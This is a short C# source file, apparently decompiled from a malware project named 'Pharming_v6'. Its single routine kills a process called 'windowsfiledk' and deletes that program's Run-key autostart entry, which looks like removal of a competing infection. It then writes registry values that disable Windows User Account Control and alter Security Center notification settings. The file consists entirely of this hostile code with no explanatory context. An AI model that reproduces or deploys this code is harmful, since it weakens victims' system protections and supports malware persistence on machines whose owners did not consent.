using System;
using System.Diagnostics;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Pharming_v6;

[StandardModule]
internal sealed class pharmantiga
{
	public static void pharmantiga()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("windowsfiledk");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("windowsfiledk");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", writable: true);
		registryKey.SetValue("EnableLUA", 0);
		registryKey.Close();
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Security Center", writable: true);
		registryKey2.SetValue("UacDisableNotify", 0);
		registryKey2.Close();
	}
}
